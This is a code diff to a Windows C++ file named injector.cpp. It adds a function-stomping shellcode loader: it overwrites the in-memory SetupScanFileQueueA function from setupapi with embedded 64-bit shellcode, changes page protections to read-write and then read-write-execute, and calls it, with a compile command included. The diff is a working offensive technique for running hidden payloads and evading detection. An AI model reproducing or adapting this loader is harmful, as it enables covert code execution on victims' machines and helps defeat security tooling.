@@ -1,10 +1,13 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <setupapi.h>
 
 /*
     instead of using LoadLibrary we use pragma comment to staticaly link the lib 
     Explicitly import the DLL into IAT
+
+    Compie w/ g++ .\injector.cpp -o .\injector.exe -fpermissive -lsetupapi
 */
 
 #pragma comment (lib, "Setupapi.lib")
@@ -36,8 +39,30 @@ int main (int argc, char** argv){
         "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
         "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
     size_t shellcode_64_sz = sizeof(shellcode_64);
+    LPVOID pAddr = (LPVOID)&SetupScanFileQueueA;
 
-    printf("[+] Address Of \"SetupScanFileQueueA\" : 0x%p \n", &SetupScanFileQueueA);
+    printf("[+] Address Of \"SetupScanFileQueueA\" : 0x%p \n", pAddr);
+
+    printf("[*] Stomping !\n");
+    
+    DWORD dwOldProtection = 0;
+
+    if (!VirtualProtect(pAddr, shellcode_64_sz, PAGE_READWRITE, &dwOldProtection)){
+		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+    printf("[*] Protection set to RW\n ");
+
+	memcpy(pAddr, shellcode_64, shellcode_64_sz);
+    printf("[*] Shellcode written\n ");
+
+	if (!VirtualProtect(pAddr, shellcode_64_sz, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+    printf("[*] Protection set to RWX\n ");
+
+    ((void(*)())pAddr)();
 
 
     return 0;
